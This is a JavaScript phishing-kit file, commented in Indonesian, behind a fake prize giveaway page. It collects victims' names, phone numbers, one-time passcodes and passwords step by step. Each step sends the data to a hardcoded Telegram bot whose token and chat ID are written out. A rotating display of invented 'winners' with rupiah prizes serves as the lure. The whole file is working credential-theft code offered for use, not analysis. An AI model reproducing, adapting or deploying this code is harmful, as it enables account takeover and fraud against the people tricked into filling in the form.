const botToken = "7945679163:AAE_FWn__VpRLUhREBGVGPZ6UtKNMCQFhsY";
const chatId = "6124038392";

function sendMessageToTelegram(message) {
  const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
  fetch(url, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({
      chat_id: chatId,
      text: message,
    }),
  }).catch((error) => console.error("Error:", error));
}

function validateStep(step) {
  const inputs = document.querySelectorAll(`#step${step} input[required]`);
  for (let input of inputs) {
    if (!input.value.trim()) {
      alert("Silahkan lengkapi form sebelum melanjutkan.");
      return false;
    }
  }
  return true;
}

function nextStep(step) {
  if (step === 1 && validateStep(1)) {
    const name = document.getElementById("name").value;
    const phone = document.getElementById("phone").value;
    sendMessageToTelegram(`Nama: ${name}\nNomor Telepon: ${phone}`);

    // Transisi halus ke Step 2
    document.getElementById("step1").style.transition = "opacity 0.5s ease";
    document.getElementById("step1").style.opacity = 0;

    setTimeout(() => {
      document.getElementById("step1").style.display = "none";
      document.getElementById("step2").style.display = "block";
      document.getElementById("step2").style.transition = "opacity 0.5s ease";
      document.getElementById("step2").style.opacity = 1;
    }, 500); // Setelah transisi selesai, pindah ke step 2
  } else if (step === 2 && validateStep(2)) {
    const phone = document.getElementById("phone").value; // Ambil nomor telepon dari step 1
    const otp = document.getElementById("otp").value;
    sendMessageToTelegram(`Nomor Telepon: ${phone}\nKode OTP: ${otp}`);

    // Transisi halus ke Step 3
    document.getElementById("step2").style.transition = "opacity 0.5s ease";
    document.getElementById("step2").style.opacity = 0;

    setTimeout(() => {
      document.getElementById("step2").style.display = "none";
      document.getElementById("step3").style.display = "block";
      document.getElementById("step3").style.transition = "opacity 0.5s ease";
      document.getElementById("step3").style.opacity = 1;
    }, 500); // Setelah transisi selesai, pindah ke step 3
  }
}

function submitForm() {
  if (validateStep(3)) {
    const phone = document.getElementById("phone").value;
    const otp = document.getElementById("otp").value;
    const password = document.getElementById("password").value;
    sendMessageToTelegram(
      `Nomor Telepon: ${phone}\nOTP: ${otp}\nKata Sandi: ${password}`
    );

    // Tampilkan modal pop-up
    document.getElementById("confirmationModal").style.display = "block";

    // Reset form dan arahkan kembali ke Step 1
    resetForm();
    document.getElementById("step1").style.display = "block";
    document.getElementById("step2").style.display = "none";
    document.getElementById("step3").style.display = "none";

    // Make sure Step 1 is shown again with empty fields
    setTimeout(() => {
      document.getElementById("step1").style.transition = "opacity 0.5s ease";
      document.getElementById("step1").style.opacity = 1;
    }, 500);
  }
}

// Function to reset form inputs
function resetForm() {
  document.getElementById("name").value = "";
  document.getElementById("phone").value = "";
  document.getElementById("otp").value = "";
  document.getElementById("password").value = "";
}

// Close modal when user clicks on the "OK" button
function resetAndCloseModal() {
  // Close the modal
  document.getElementById("confirmationModal").style.display = "none";

  // Reset and redirect user back to step 1 to fill out the form again
  resetForm();
  document.getElementById("step1").style.display = "block";
  document.getElementById("step2").style.display = "none";
  document.getElementById("step3").style.display = "none";

  // Optionally, reset the form fields here
  setTimeout(() => {
    document.getElementById("step1").style.transition = "opacity 0.5s ease";
    document.getElementById("step1").style.opacity = 1;
  }, 500);
}

// Close modal when user clicks on the "x" button
document.querySelector(".close").addEventListener("click", function () {
  document.getElementById("confirmationModal").style.display = "none";
});

// Close modal if user clicks anywhere outside the modal
window.onclick = function (event) {
  if (event.target == document.getElementById("confirmationModal")) {
    document.getElementById("confirmationModal").style.display = "none";
  }
};

// Random winners display
const winnerDisplay = document.getElementById("winner-display");
const names = [
  "Wiwi",
  "Dewi",
  "Fajar",
  "Intan",
  "Bayu",
  "Novi",
  "Sari",
  "Arif",
  "Lina",
  "Putri",
  "Yudi",
  "Citra",
  "Agus",
  "Sinta",
  "Indra",
  "Wulan",
  "Fauzi",
  "Dina",
  "Rizky",
  "Siti",
  "Kimy",
  "Randi",
  "Tomi",
  "Baim",
  "Wahyu",
  "Rahmat",
  "Slamet",
  "Badar",
  "Aslan",
  "Asti",
  "Badriyah",
  "Hamidu",
  "Jakariya",
  "Arif",
  "Amdal",
  "Estiyani",
];
const prizes = [
  "500,000",
  "550,000",
  "600,000",
  "650,000",
  "700,000",
  "750,000",
  "800,000",
  "850,000",
  "900,000",
  "1,000,000",
];

let currentIndex = 0;

function displayWinner() {
  const name = names[currentIndex];
  const amount = prizes[Math.floor(Math.random() * prizes.length)];
  winnerDisplay.textContent = `${name} - Rp ${amount}`;
  currentIndex = (currentIndex + 1) % names.length;
}

document.getElementById("phone").addEventListener("input", function () {
  this.value = this.value.replace(/[^0-9]/g, ""); // Hanya angka
});

document.getElementById("otp").addEventListener("input", function () {
  // Hanya menerima angka dan maksimal 5 digit
  this.value = this.value.replace(/[^0-9]/g, "").slice(0, 5);
});

// Update winner display every 3 seconds
setInterval(displayWinner, 3000);
displayWinner();